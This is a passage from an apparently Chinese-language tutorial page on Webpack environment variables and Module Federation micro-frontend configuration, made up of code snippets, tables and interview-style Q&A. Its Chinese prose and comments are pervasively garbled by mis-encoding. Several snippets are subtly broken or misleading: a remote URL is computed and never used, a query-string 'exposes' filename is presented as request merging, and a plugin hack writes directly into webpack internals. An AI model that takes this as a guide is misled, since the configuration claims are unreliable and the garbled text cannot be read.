class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs TypeScript"><span class="hljs-comment">// env.d.ts</span><br><span class="hljs-keyword">declare</span> <span class="hljs-keyword">namespace</span> <span class="hljs-title class_">NodeJS</span> &#123;<br>  <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ProcessEnv</span> &#123;<br>    <span class="hljs-keyword">readonly</span> <span class="hljs-attr">API_BASE_URL</span>: <span class="hljs-built_in">string</span>;<br>    <span class="hljs-keyword">readonly</span> <span class="hljs-variable constant_">DEBUG_MODE</span>?: <span class="hljs-string">&#x27;true&#x27;</span> | <span class="hljs-string">&#x27;false&#x27;</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ä¸šåŠ¡ä»£ç </span><br><span class="hljs-keyword">const</span> <span class="hljs-attr">apiUrl</span>: <span class="hljs-built_in">string</span> = process.<span class="hljs-property">env</span>.<span class="hljs-property">API_BASE_URL</span>;<br></code></pre></td></tr></table></figure><p>(2) ç¯å¢ƒå˜é‡æ ¡éªŒ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å¯åŠ¨æ—¶éªŒè¯å¿…è¦å˜é‡</span><br><span class="hljs-keyword">const</span> requiredVars = [<span class="hljs-string">&#x27;API_BASE_URL&#x27;</span>];<br>requiredVars.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">varName</span> =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (!process.<span class="hljs-property">env</span>[varName]) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`ç¼ºå°‘ç¯å¢ƒå˜é‡: <span class="hljs-subst">$&#123;varName&#125;</span>`</span>);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>(3) å¤šç¯å¢ƒé…ç½®ç”Ÿæˆ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ ¹æ®ç¯å¢ƒç”Ÿæˆä¸åŒé…ç½®å¯¹è±¡</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">getConfig</span> = (<span class="hljs-params"></span>) =&gt; (&#123;<br>  <span class="hljs-attr">api</span>: &#123;<br>    <span class="hljs-attr">baseURL</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">API_BASE_URL</span>,<br>    <span class="hljs-attr">timeout</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">&#x27;development&#x27;</span> ? <span class="hljs-number">30000</span> : <span class="hljs-number">10000</span><br>  &#125;,<br>  <span class="hljs-attr">sentry</span>: &#123;<br>    <span class="hljs-attr">dsn</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">SENTRY_DSN</span> || <span class="hljs-string">&#x27;&#x27;</span>,<br>    <span class="hljs-attr">enabled</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">&#x27;production&#x27;</span><br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>é¢è¯•é«˜é¢‘é—®é¢˜</strong></p><p>Qï¼šå‰ç«¯ä¸ºä»€ä¹ˆä¸èƒ½ç›´æ¥ä½¿ç”¨ process.envï¼Ÿ</p><p>Node.js çš„ process.env ä»…åœ¨æ„å»ºé˜¶æ®µå¯ç”¨ï¼ŒDefinePlugin é€šè¿‡å­—ç¬¦ä¸²æ›¿æ¢å°†å˜é‡ç¡¬ç¼–ç åˆ°å®¢æˆ·ç«¯ä»£ç ä¸­</p><p>Qï¼šå¦‚ä½•é˜²æ­¢æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Ÿ</p><p>å®‰å…¨ç­–ç•¥ï¼š</p><ul><li>ä½¿ç”¨ Dotenv çš„ allowlist è¿‡æ»¤å˜é‡</li><li>åœ¨ .gitignore ä¸­æ’é™¤ç”Ÿäº§ç¯å¢ƒæ–‡ä»¶</li><li>æ•æ„Ÿå˜é‡é€šè¿‡ CI&#x2F;CD ç®¡é“æ³¨å…¥</li></ul><p>Qï¼šå¼€å‘ç¯å¢ƒä¸ç”Ÿäº§ç¯å¢ƒå˜é‡å†²çªæ€ä¹ˆåŠï¼Ÿ</p><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Dotenv</span>(&#123;<br>  <span class="hljs-attr">path</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">CUSTOM_ENV</span> ? <span class="hljs-string">`.env.<span class="hljs-subst">$&#123;process.env.CUSTOM_ENV&#125;</span>`</span> : <span class="hljs-literal">null</span><br>&#125;)<br></code></pre></td></tr></table></figure><p>å¯åŠ¨å‘½ä»¤ï¼šCUSTOM_ENV&#x3D;staging npm run build</p><h2 id="4-2-å¾®å‰ç«¯é›†æˆ"><a href="#4-2-å¾®å‰ç«¯é›†æˆ" class="headerlink" title="4.2 å¾®å‰ç«¯é›†æˆ"></a>4.2 å¾®å‰ç«¯é›†æˆ</h2><h3 id="4-2-1-Module-FederationåŸç†ä¸é…ç½®"><a href="#4-2-1-Module-FederationåŸç†ä¸é…ç½®" class="headerlink" title="4.2.1 Module FederationåŸç†ä¸é…ç½®"></a>4.2.1 Module FederationåŸç†ä¸é…ç½®</h3><p>Module Federationï¼ˆæ¨¡å—è”é‚¦ï¼‰æ˜¯ Webpack 5 çš„é©å‘½æ€§ç‰¹æ€§ï¼Œå®ç°è·¨åº”ç”¨å®æ—¶å…±äº«æ¨¡å—ï¼Œå½»åº•æ”¹å˜å¾®å‰ç«¯æ¶æ„æ¨¡å¼ã€‚</p><p><strong>æ ¸å¿ƒç†å¿µ</strong></p><pre class="mermaid">graph LR  AppA[åº”ç”¨A] -- è¿è¡Œæ—¶åŠ è½½ --> Shared[å…±äº«æ¨¡å—]  AppB[åº”ç”¨B] -- ç›´æ¥ä½¿ç”¨ --> Shared  Shared[React/å·¥å…·åº“/ä¸šåŠ¡ç»„ä»¶] -- ä»…åŠ è½½ä¸€æ¬¡ --> Browser</pre><p>æ ¸å¿ƒä»·å€¼ï¼š</p><ul><li>é¿å…é‡å¤ä¾èµ–åŠ è½½</li><li>åº”ç”¨ç‹¬ç«‹å¼€å‘éƒ¨ç½²</li><li>è¿è¡Œæ—¶åŠ¨æ€æ¨¡å—å…±äº«</li></ul><p><strong>æ ¸å¿ƒé…ç½®é¡¹è§£æ</strong></p><p>(1) åŸºç¡€é…ç½®ç»“æ„</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// app1/webpack.config.js</span><br><span class="hljs-keyword">const</span> &#123; <span class="hljs-title class_">ModuleFederationPlugin</span> &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;webpack&#x27;</span>).<span class="hljs-property">container</span>;<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">plugins</span>: [<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModuleFederationPlugin</span>(&#123;<br>      <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;app1&#x27;</span>,                  <span class="hljs-comment">// å”¯ä¸€IDï¼ˆå¿…å¡«ï¼‰</span><br>      <span class="hljs-attr">filename</span>: <span class="hljs-string">&#x27;remoteEntry.js&#x27;</span>,    <span class="hljs-comment">// å…¥å£æ–‡ä»¶å</span><br>      <span class="hljs-attr">exposes</span>: &#123;                     <span class="hljs-comment">// æš´éœ²ç»™å¤–éƒ¨çš„æ¨¡å—</span><br>        <span class="hljs-string">&#x27;./Button&#x27;</span>: <span class="hljs-string">&#x27;./src/Button.jsx&#x27;</span>,<br>        <span class="hljs-string">&#x27;./Store&#x27;</span>: <span class="hljs-string">&#x27;./src/redux/store.js&#x27;</span><br>      &#125;,<br>      <span class="hljs-attr">remotes</span>: &#123;                     <span class="hljs-comment">// å¼•ç”¨è¿œç¨‹æ¨¡å—</span><br>        <span class="hljs-attr">app2</span>: <span class="hljs-string">&#x27;app2@http://cdn.com/app2/remoteEntry.js&#x27;</span><br>      &#125;,<br>      <span class="hljs-attr">shared</span>: &#123;                      <span class="hljs-comment">// å…±äº«ä¾èµ–</span><br>        <span class="hljs-attr">react</span>: &#123; <span class="hljs-attr">singleton</span>: <span class="hljs-literal">true</span> &#125;,   <span class="hljs-comment">// å•ä¾‹æ¨¡å¼</span><br>        <span class="hljs-string">&#x27;react-dom&#x27;</span>: &#123; <span class="hljs-attr">eager</span>: <span class="hljs-literal">true</span> &#125;  <span class="hljs-comment">// ç«‹å³åŠ è½½</span><br>      &#125;<br>    &#125;)<br>  ]<br>&#125;;<br></code></pre></td></tr></table></figure><p>(2) å…³é”®é…ç½®é¡¹è¯´æ˜</p><table><thead><tr><th align="left">é…ç½®é¡¹</th><th align="left">ç±»å‹</th><th align="left">ä½œç”¨</th></tr></thead><tbody><tr><td align="left">name</td><td align="left">string</td><td align="left">åº”ç”¨å”¯ä¸€æ ‡è¯†ï¼ˆå…¨å±€å‘½åç©ºé—´ï¼‰</td></tr><tr><td align="left">filename</td><td align="left">string</td><td align="left">ç”Ÿæˆçš„å…¥å£æ–‡ä»¶ï¼ˆé»˜è®¤remoteEntry.jsï¼‰</td></tr><tr><td align="left">exposes</td><td align="left">object</td><td align="left">æš´éœ²çš„æ¨¡å—è·¯å¾„ï¼ˆkeyä¸ºå…¬å…±è·¯å¾„ï¼Œvalueä¸ºæœ¬åœ°è·¯å¾„ï¼‰</td></tr><tr><td align="left">remotes</td><td align="left">object</td><td align="left">è¿œç¨‹æ¨¡å—æ˜ å°„ï¼ˆkeyä¸ºå¼•ç”¨åï¼Œvalueä¸º<code>&lt;name&gt;@&lt;url&gt;</code>æ ¼å¼ï¼‰</td></tr><tr><td align="left">shared</td><td align="left">object&#x2F;array</td><td align="left">å…±äº«çš„ä¾èµ–åº“ï¼ˆå¯é…ç½®åŠ è½½ç­–ç•¥ï¼‰</td></tr></tbody></table><p><strong>å…±äº«ä¾èµ–ç­–ç•¥</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">shared</span>: &#123;<br>  <span class="hljs-attr">react</span>: &#123;<br>    <span class="hljs-attr">singleton</span>: <span class="hljs-literal">true</span>,    <span class="hljs-comment">// åªåŠ è½½ä¸€ä¸ªç‰ˆæœ¬ï¼ˆä¸åŒç‰ˆæœ¬ä¼šè­¦å‘Šï¼‰</span><br>    <span class="hljs-attr">requiredVersion</span>: <span class="hljs-string">&#x27;^17.0.0&#x27;</span>,  <span class="hljs-comment">// æŒ‡å®šç‰ˆæœ¬èŒƒå›´</span><br>    <span class="hljs-attr">eager</span>: <span class="hljs-literal">false</span>,       <span class="hljs-comment">// ä¸ç«‹å³åŠ è½½ï¼ˆå¼‚æ­¥æŒ‰éœ€ï¼‰</span><br>    <span class="hljs-attr">strictVersion</span>: <span class="hljs-literal">true</span> <span class="hljs-comment">// ä¸¥æ ¼ç‰ˆæœ¬åŒ¹é…ï¼ˆä¸åŒ¹é…æŠ¥é”™ï¼‰</span><br>  &#125;,<br>  <span class="hljs-attr">lodash</span>: &#123;<br>    <span class="hljs-attr">eager</span>: <span class="hljs-literal">true</span>,        <span class="hljs-comment">// ä¸»åº”ç”¨å¯åŠ¨æ—¶ç«‹å³åŠ è½½</span><br>    <span class="hljs-attr">version</span>: <span class="hljs-string">&#x27;4.17.21&#x27;</span>  <span class="hljs-comment">// æ˜¾å¼å£°æ˜ç‰ˆæœ¬</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç‰ˆæœ¬å†²çªè§£å†³æ–¹æ¡ˆï¼š</p><ul><li>ä½¿ç”¨ singleton: true å¼ºåˆ¶å•ä¾‹</li><li>é€šè¿‡ requiredVersion çº¦æŸç‰ˆæœ¬èŒƒå›´</li><li>è‡ªå®šä¹‰ get æ–¹æ³•å®ç°ç‰ˆæœ¬é™çº§</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">shared</span>: &#123;<br>  <span class="hljs-attr">react</span>: &#123;<br>    <span class="hljs-attr">get</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;react&#x27;</span>))<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>åŠ¨æ€è¿œç¨‹åŠ è½½</strong></p><p>(1) è¿è¡Œæ—¶å†³å®šè¿œç¨‹åœ°å€</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä¸šåŠ¡ä»£ç ä¸­åŠ¨æ€åŠ è½½</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">RemoteButton</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> url = <span class="hljs-variable language_">window</span>.<span class="hljs-property">isAdmin</span> <br>    ? <span class="hljs-string">&#x27;http://admin-app/remoteEntry.js&#x27;</span><br>    : <span class="hljs-string">&#x27;http://user-app/remoteEntry.js&#x27;</span>;<br>    <br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;app2/Button&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">module</span> =&gt;</span> (&#123;<br>    <span class="hljs-attr">default</span>: <span class="hljs-variable language_">module</span>.<span class="hljs-property">Button</span><br>  &#125;));<br>&#125;);<br></code></pre></td></tr></table></figure><p>(2) Promise-based è¿œç¨‹è§£æ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-attr">remotes</span>: &#123;<br>  <span class="hljs-attr">app2</span>: <span class="hljs-string">`promise new Promise(resolve =&gt; &#123;</span><br><span class="hljs-string">    const urlParams = new URLSearchParams(window.location.search);</span><br><span class="hljs-string">    const version = urlParams.get(&#x27;app2Version&#x27;) || &#x27;latest&#x27;;</span><br><span class="hljs-string">    resolve(&#123;</span><br><span class="hljs-string">      get: () =&gt; window.app2[version],</span><br><span class="hljs-string">      init: (arg) =&gt; window.app2[arg].init(arg)</span><br><span class="hljs-string">    &#125;);</span><br><span class="hljs-string">  &#125;)`</span><br></code></pre></td></tr></table></figure><p><strong>ä¼ä¸šçº§åº”ç”¨åœºæ™¯</strong></p><p>(1) å¾®å‰ç«¯æ¶æ„</p><pre class="mermaid">graph TD  Shell[ä¸»åº”ç”¨] --> AppA[äº§å“æ¨¡å—]  Shell --> AppB[è®¢å•æ¨¡å—]  Shell --> AppC[ç”¨æˆ·æ¨¡å—]  shared[å…±äº«React/çŠ¶æ€ç®¡ç†] --> Shell & AppA & AppB & AppC</pre><p>(2) è·¨å›¢é˜Ÿç»„ä»¶å…±äº«</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ç»„ä»¶æä¾›æ–¹</span><br><span class="hljs-attr">exposes</span>: &#123;<br>  <span class="hljs-string">&#x27;./DataTable&#x27;</span>: <span class="hljs-string">&#x27;./src/components/DataTable.jsx&#x27;</span><br>&#125;<br><br><span class="hljs-comment">// æ¶ˆè´¹è€…åº”ç”¨</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">DataTable</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;team_ui/DataTable&#x27;</span>));<br></code></pre></td></tr></table></figure><p>(3) æ’ä»¶åŒ–ç³»ç»Ÿ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åŠ¨æ€æ³¨å†Œæ’ä»¶</span><br><span class="hljs-variable language_">window</span>.<span class="hljs-property">registerPlugin</span> = <span class="hljs-function">(<span class="hljs-params">name, <span class="hljs-variable language_">module</span></span>) =&gt;</span> &#123;<br>  __webpack_require__.<span class="hljs-property">m</span>[name] = <span class="hljs-variable language_">module</span>;<br>&#125;;<br><br><span class="hljs-comment">// æ’ä»¶ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> plugin = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;paymentPlugin/PayModule&#x27;</span>);<br></code></pre></td></tr></table></figure><p><strong>æ€§èƒ½ä¼˜åŒ–ç­–ç•¥</strong></p><p>(1) å…±äº«ä¾èµ–é¢„åŠ è½½</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- ä¸»åº”ç”¨HTMLä¸­é¢„åŠ è½½ --&gt;<br>&lt;link rel=&quot;preload&quot; href=&quot;https://cdn.com/shared-react.js&quot; as=&quot;script&quot;&gt;<br></code></pre></td></tr></table></figure><p>(2) æŒ‰éœ€åŠ è½½æš´éœ²æ¨¡å—</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä½¿ç”¨import()åŠ¨æ€åŠ è½½</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">ProductModal</span> = (<span class="hljs-params"></span>) =&gt; <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;productApp/Modal&#x27;</span>);<br></code></pre></td></tr></table></figure><p>(3) è¯·æ±‚åˆå¹¶ï¼ˆHTTP&#x2F;2ï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é…ç½®å¤šä¸ªexposesæ—¶ç”Ÿæˆå•ä¸ªå…¥å£æ–‡ä»¶</span><br><span class="hljs-attr">filename</span>: <span class="hljs-string">&#x27;remoteEntry.js?exposes=Button,Store&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>å¸¸è§é—®é¢˜è§£å†³æ–¹æ¡ˆ</strong></p><p>Qï¼šå¦‚ä½•è§£å†³è·¨åŸŸé—®é¢˜ï¼Ÿ</p><p>æ–¹æ¡ˆ1ï¼šå¼€å‘ç¯å¢ƒé…ç½® devServer.headers</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">devServer</span>: &#123;<br>  <span class="hljs-attr">headers</span>: &#123; <span class="hljs-string">&#x27;Access-Control-Allow-Origin&#x27;</span>: <span class="hljs-string">&#x27;*&#x27;</span> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ–¹æ¡ˆ2ï¼šç”Ÿäº§ç¯å¢ƒé…ç½®CDN CORSç­–ç•¥</p><p>Qï¼šå…±äº«æ¨¡å—ç‰ˆæœ¬ä¸å…¼å®¹ï¼Ÿ</p><p>æ–¹æ¡ˆï¼š</p><ul><li>ä½¿ç”¨ requiredVersion çº¦æŸç‰ˆæœ¬</li><li>å°è£…é€‚é…å±‚æ¥å£</li><li>é™çº§åˆ°ç‹¬ç«‹åŠ è½½æ¨¡å¼</li></ul><p>Qï¼šå¦‚ä½•è°ƒè¯•è¿œç¨‹æ¨¡å—ï¼Ÿ</p><p>æ–¹æ¡ˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-attr">devtool</span>: <span class="hljs-string">&#x27;source-map&#x27;</span>,<br><span class="hljs-attr">plugins</span>: [<br>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModuleFederationPlugin</span>(&#123; <br>    <span class="hljs-attr">exposes</span>: &#123; ... &#125;,<br>    <span class="hljs-attr">shared</span>: &#123; <span class="hljs-string">&#x27;react&#x27;</span>: &#123; <span class="hljs-attr">shareScope</span>: <span class="hljs-string">&#x27;debug&#x27;</span> &#125; &#125; <span class="hljs-comment">// ç‹¬ç«‹ä½œç”¨åŸŸ</span><br>  &#125;)<br>]<br></code></pre></td></tr></table></figure><h3 id="4-2-2-è·¨åº”ç”¨å…±äº«æ¨¡å—ç­–ç•¥"><a href="#4-2-2-è·¨åº”ç”¨å…±äº«æ¨¡å—ç­–ç•¥" class="headerlink" title="4.2.2 è·¨åº”ç”¨å…±äº«æ¨¡å—ç­–ç•¥"></a>4.2.2 è·¨åº”ç”¨å…±äº«æ¨¡å—ç­–ç•¥</h3><p><strong>å…±äº«æ¨¡å—ç±»å‹ä¸ç­–ç•¥çŸ©é˜µ</strong></p><table><thead><tr><th align="left">æ¨¡å—ç±»å‹</th><th align="left">å…±äº«ç­–ç•¥</th><th align="left">é£é™©æ§åˆ¶</th><th align="left">å…¸å‹æ¡ˆä¾‹</th></tr></thead><tbody><tr><td align="left">åŸºç¡€æ¡†æ¶</td><td align="left">å¼ºåˆ¶å•ä¾‹ + ä¸¥æ ¼ç‰ˆæœ¬</td><td align="left">singleton: true + requiredVersion</td><td align="left">React&#x2F;Vue æ ¸å¿ƒåº“</td></tr><tr><td align="left">UIç»„ä»¶åº“</td><td align="left">æŒ‰éœ€åŠ è½½ + å®½æ¾ç‰ˆæœ¬</td><td align="left">eager: false + è¯­ä¹‰åŒ–ç‰ˆæœ¬</td><td align="left">Ant Design &#x2F; Element UI</td></tr><tr><td align="left">çŠ¶æ€ç®¡ç†</td><td align="left">å•ä¾‹ + è‡ªå®šä¹‰åˆå§‹åŒ–</td><td align="left">init å›è°ƒç»Ÿä¸€é…ç½®</td><td align="left">Redux Store &#x2F; Pinia</td></tr><tr><td align="left">ä¸šåŠ¡å·¥å…·åº“</td><td align="left">å¤šç‰ˆæœ¬å¹¶è¡Œ + éš”ç¦»</td><td align="left">import() åŠ¨æ€åŠ è½½</td><td align="left">æ”¯ä»˜SDK&#x2F;åŸ‹ç‚¹å·¥å…·</td></tr><tr><td align="left">é…ç½®å¯¹è±¡</td><td align="left">ä¸å…±äº« + ç‹¬ç«‹åŠ è½½</td><td align="left">é€šè¿‡APIé€šä¿¡è·å–</td><td align="left">æƒé™é…ç½®&#x2F;å¤šè¯­è¨€èµ„æº</td></tr></tbody></table><p><strong>ç‰ˆæœ¬å†²çªè§£å†³æ–¹æ¡ˆ</strong></p><p>(1) è¯­ä¹‰åŒ–ç‰ˆæœ¬æ§åˆ¶</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">shared</span>: &#123;<br>  <span class="hljs-string">&#x27;react-dom&#x27;</span>: &#123;<br>    <span class="hljs-attr">requiredVersion</span>: <span class="hljs-string">&#x27;^18.1.0&#x27;</span>, <span class="hljs-comment">// å…è®¸18.xæœ€æ–°ç‰ˆæœ¬</span><br>    <span class="hljs-attr">strictVersion</span>: <span class="hljs-literal">false</span>       <span class="hljs-comment">// éä¸¥æ ¼åŒ¹é…</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) ç‰ˆæœ¬é™çº§é€‚é…å±‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åˆ›å»ºé€‚é…æ¨¡å—</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">compatibleVue2</span>(<span class="hljs-params">originalVue</span>) &#123;<br>  <span class="hljs-keyword">return</span> originalVue.<span class="hljs-title function_">extend</span>(&#123; <span class="hljs-comment">/* å…¼å®¹é€»è¾‘ */</span> &#125;);<br>&#125;<br><br><span class="hljs-comment">// æ¶ˆè´¹è€…åº”ç”¨</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">Vue</span> = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;legacyApp/vue&#x27;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">CompatibleVue</span> = <span class="hljs-title function_">compatibleVue2</span>(<span class="hljs-title class_">Vue</span>);<br></code></pre></td></tr></table></figure><p>(3) è¿è¡Œæ—¶ç‰ˆæœ¬æ£€æµ‹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä¸»åº”ç”¨åˆå§‹åŒ–æ—¶</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>.<span class="hljs-property">sharedReact</span> &amp;&amp; <span class="hljs-variable language_">window</span>.<span class="hljs-property">sharedReact</span>.<span class="hljs-property">version</span> !== <span class="hljs-string">&#x27;18.2.0&#x27;</span>) &#123;<br>  <span class="hljs-title function_">showWarning</span>(<span class="hljs-string">&#x27;Reactç‰ˆæœ¬ä¸å…¼å®¹ï¼Œæ­£åœ¨é™çº§...&#x27;</span>);<br>  <span class="hljs-title function_">loadFallbackReact</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ€§èƒ½ä¼˜åŒ–ç­–ç•¥</strong></p><p>(1) å±‚çº§åŒ–å…±äº«</p><p>æ¶æ„è®¾è®¡ï¼š</p><pre class="mermaid">graph BT  MainApp[ä¸»åº”ç”¨] -->|å…±äº«| Core[æ ¸å¿ƒåº“]  SubAppA[å­åº”ç”¨A] --> Core  SubAppB[å­åº”ç”¨B] --> Core  SubAppA -->|ç§æœ‰å…±äº«| UtilsA[å·¥å…·åº“A]  SubAppB -->|ç§æœ‰å…±äº«| UtilsB[å·¥å…·åº“B]</pre><p>(2) å…±äº«æ¨¡å—é¢„åŠ è½½</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- ä¸»åº”ç”¨HTML --&gt;<br>&lt;link rel=&quot;preload&quot; href=&quot;https://cdn.com/shared-react.js&quot; as=&quot;script&quot; crossorigin&gt;<br>&lt;link rel=&quot;preload&quot; href=&quot;https://cdn.com/antd.js&quot; as=&quot;script&quot; crossorigin&gt;<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 